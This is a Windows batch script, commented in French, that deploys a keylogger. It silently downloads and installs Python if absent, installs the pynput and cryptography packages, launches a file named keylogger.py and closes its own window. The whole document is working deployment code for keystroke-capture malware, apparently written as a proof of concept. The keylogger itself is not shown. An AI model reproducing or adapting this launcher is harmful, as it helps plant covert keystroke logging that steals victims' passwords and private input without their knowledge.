@echo off
title INSTALLATION ET LANCEMENT (V6)
color 0A

echo.
echo ========================================================
echo      DEMARRAGE DU KEYLOGGER (PREUVE FINALE)
echo ========================================================
echo [INFO] Le script va utiliser le chemin d'acces direct.
echo.

:: 1. DEFINITION DES CHEMINS D'ACCES (Ajustement selon l'installation par défaut)
set PYTHON_DIR="C:\Program Files\Python311"
set PYTHON_EXE="%PYTHON_DIR%\python.exe"
set PIP_EXE="%PYTHON_DIR%\Scripts\pip.exe"

:: 2. VERIFICATION PYTHON ET INSTALLATION SI NECESSAIRE
:: Si le chemin d'accès Python n'existe pas, on tente l'installation complète
if not exist %PYTHON_EXE% (
    echo [ACTION] Telechargement de Python...
    curl -o python_installer.exe https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe >nul 2>&1
    
    echo [ACTION] Installation silencieuse en cours...
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    
    del python_installer.exe
    echo [SUCCES] Python installe.
) else (
    echo [OK] Python est deja present.
)

:: 3. INSTALLATION DES DEPENDANCES (Utilisation du chemin absolu)
echo.
echo [ACTION] Installation des dependances (pynput, cryptography)...
%PYTHON_EXE% -m pip install pynput cryptography

if %errorlevel% equ 0 (
    echo [SUCCES] Pynput installe.
    
    :: 4. LANCEMENT DU KEYLOGGER (Utilisation du chemin absolu)
    echo.
    echo [LANCEMENT] Demarrage du Keylogger...
    echo.
    
    :: Fermer le terminal actuel et lancer le keylogger
    start "" %PYTHON_EXE% keylogger.py
    exit
) else (
    color 0C
    echo [ERREUR CRITIQUE] Echec de l'installation de Pynput.
)

pause
